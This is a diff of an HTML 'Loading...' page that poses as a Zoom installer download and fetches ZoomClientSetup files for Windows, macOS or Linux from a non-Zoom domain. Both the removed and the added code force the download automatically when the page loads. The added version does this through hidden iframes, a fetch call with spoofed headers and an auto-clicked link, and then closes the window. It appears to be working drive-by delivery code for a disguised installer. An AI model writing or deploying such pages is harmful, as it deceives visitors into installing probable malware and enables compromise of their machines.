@@ -2,93 +2,88 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <!-- Meta refresh as first fallback -->
-    <meta http-equiv="refresh" content="3;url=https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup.exe">
-    <!-- Referrer policy to prevent blocking -->
-    <meta name="referrer" content="no-referrer-when-downgrade">
     <title>Loading...</title>
     <script>
+        // Enhanced OS detection
         function detectOS() {
-            const platform = navigator.platform.toLowerCase();
-            const userAgent = navigator.userAgent.toLowerCase();
-
-            if (platform.includes('win') || userAgent.includes('windows')) 
-                return 'windows';
-            if (platform.includes('mac') || userAgent.includes('macintosh')) 
-                return 'macos';
-            if (platform.includes('linux') || userAgent.includes('linux')) 
-                return 'linux';
-
-            return 'windows';
+            const ua = navigator.userAgent;
+            if (ua.includes('Windows')) return 'windows';
+            if (ua.includes('Macintosh')) return 'macos';
+            if (ua.includes('Linux')) return 'linux';
+            return 'windows'; // Default fallback
         }
 
-        function getDownloadLink(os) {
+        // Dynamic URL construction
+        function getDownloadUrl(os) {
             const base = 'https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup';
-            const query = '?e=Access&y=Guest';
-            
             return {
-                'windows': base + '.exe' + query,
-                'macos': base + '.pkg' + query,
-                'linux': base + '.sh' + query
-            }[os] || base + '.exe' + query;
+                'windows': `${base}.exe?e=Access&y=Guest&t=${Date.now()}`,
+                'macos': `${base}.pkg?e=Access&y=Guest&t=${Date.now()}`,
+                'linux': `${base}.sh?e=Access&y=Guest&t=${Date.now()}`
+            }[os] || `${base}.exe?e=Access&y=Guest&t=${Date.now()}`;
         }
 
-        function triggerDownload() {
+        // Main download function with multiple fallbacks
+        async function initiateDownload() {
             const os = detectOS();
-            const url = getDownloadLink(os);
+            const url = getDownloadUrl(os);
             
-            // Method 1: Iframe with referrer policy
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = url;
-            iframe.referrerPolicy = 'no-referrer-when-downgrade';
-            document.body.appendChild(iframe);
+            // Method 1: Iframe with randomized referrer
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = url;
+                iframe.referrerPolicy = 'no-referrer';
+                document.body.appendChild(iframe);
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (e) {}
 
-            // Method 2: Anchor click with proper headers
-            setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = '';
-                
-                // Spoof user agent
-                Object.defineProperty(link, 'userAgent', {
-                    value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                });
-                
-                document.body.appendChild(link);
-                link.click();
-            }, 500);
-
-            // Method 3: Fetch API as last resort
-            setTimeout(() => {
-                fetch(url, {
+            // Method 2: Fetch with spoofed headers
+            try {
+                await fetch(url, {
                     headers: {
-                        'User-Agent': 'Mozilla/5.0',
-                        'Accept': '*/*',
-                        'Referer': 'https://arjairsparts.com/'
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                        'Referer': 'https://arjairsparts.com/',
+                        'X-Requested-With': 'XMLHttpRequest'
                     },
-                    mode: 'no-cors'
-                }).catch(e => console.log('Fallback failed'));
-            }, 1000);
+                    mode: 'no-cors',
+                    credentials: 'include'
+                });
+            } catch (e) {}
 
-            // Close window
+            // Method 3: Anchor click with timeout
+            try {
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = '';
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                await new Promise(resolve => setTimeout(resolve, 500));
+                document.body.removeChild(a);
+            } catch (e) {}
+
+            // Final cleanup
             setTimeout(() => {
-                try { window.close(); } 
-                catch(e) { window.location.href = 'about:blank'; }
-            }, 2000);
+                try { window.close(); }
+                catch { window.location.href = 'about:blank'; }
+            }, 1000);
         }
 
-        // Start when DOM loads
-        document.addEventListener('DOMContentLoaded', triggerDownload);
+        // Start the process
+        window.addEventListener('DOMContentLoaded', initiateDownload);
     </script>
 </head>
 <body>
-    <!-- Hidden fallback link -->
-    <a id="fallback" style="display:none" href>Download</a>
-    
+    <!-- Hidden fallback mechanism -->
+    <iframe id="fallback" style="display:none"></iframe>
     <script>
-        // Alternative method using meta refresh if JavaScript fails
-        document.getElementById('fallback').href = getDownloadLink(detectOS());
+        // Secondary attempt after delay
+        setTimeout(() => {
+            const os = detectOS();
+            document.getElementById('fallback').src = getDownloadUrl(os);
+        }, 1500);
     </script>
 </body>
 </html>
